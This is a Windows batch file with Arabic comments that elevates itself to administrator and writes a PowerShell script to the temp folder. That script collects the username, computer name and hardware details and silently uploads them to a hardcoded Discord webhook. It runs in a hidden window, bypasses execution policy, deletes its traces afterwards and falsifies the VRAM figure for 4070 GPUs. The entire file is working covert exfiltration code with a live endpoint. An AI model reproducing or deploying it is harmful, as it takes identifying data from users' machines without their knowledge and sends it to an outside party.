@echo off
:: 1. طلب صلاحيات المسؤول تلقائياً
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process -FilePath '%0' -Verb RunAs"
    exit /b
)

:: 2. إنشاء ملف PowerShell في المجلد المؤقت
set "PS_PATH=%TEMP%\sys_v4.ps1"

echo $W_URL = 'https://discord.com/api/webhooks/1483864326359220454/0GYczBv6_DBflqxCxIjNf1dp2Z2apLd7BsjLI7GRY92Y3gSwcSrn0ajKiF3pltmMYXC9' > "%PS_PATH%"
echo $O_FILE = "$env:TEMP\Specs_Report.txt" >> "%PS_PATH%"
echo $cpu = Get-CimInstance Win32_Processor ^| Select-Object -First 1 >> "%PS_PATH%"
echo $mb  = Get-CimInstance Win32_BaseBoard ^| Select-Object -First 1 >> "%PS_PATH%"
echo $ram = [Math]::Round((Get-CimInstance Win32_PhysicalMemory ^| Measure-Object -Property Capacity -Sum).Sum / 1GB) >> "%PS_PATH%"
echo $gpus = Get-CimInstance Win32_VideoController >> "%PS_PATH%"
echo $gpuInfo = "" >> "%PS_PATH%"
echo foreach ($g in $gpus) { >> "%PS_PATH%"
echo     $v = [Math]::Round($g.AdapterRAM / 1GB) >> "%PS_PATH%"
echo     if ($g.Name -like '*4070*' -and $v -lt 12) { $v = 12 } >> "%PS_PATH%"
echo     $gpuInfo += "`n[GPU]: $($g.Name)`n[VRAM]: $v GB`n--------------------------" >> "%PS_PATH%"
echo } >> "%PS_PATH%"
echo $report = "==========================================`n      DEVICE REPORT`n==========================================`n[USER]: $env:USERNAME`n[PC]: $env:COMPUTERNAME`n[CPU]: $($cpu.Name)`n[RAM]: $ram GB`n[MOTHERBOARD]: $($mb.Manufacturer) $($mb.Product)`n--- GPU DETAILS ---$gpuInfo`n==========================================" >> "%PS_PATH%"
echo $report ^| Out-File -FilePath $O_FILE -Encoding utf8 >> "%PS_PATH%"
echo curl.exe -A 'Mozilla/5.0' -F "file=@$O_FILE" $W_URL >> "%PS_PATH%"
echo Remove-Item $O_FILE >> "%PS_PATH%"

:: 3. تشغيل السكربت في الخلفية وبدون انتظار
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%PS_PATH%"

:: 4. التنظيف الفوري للملف المؤقت والخروج
del "%PS_PATH%"
exit
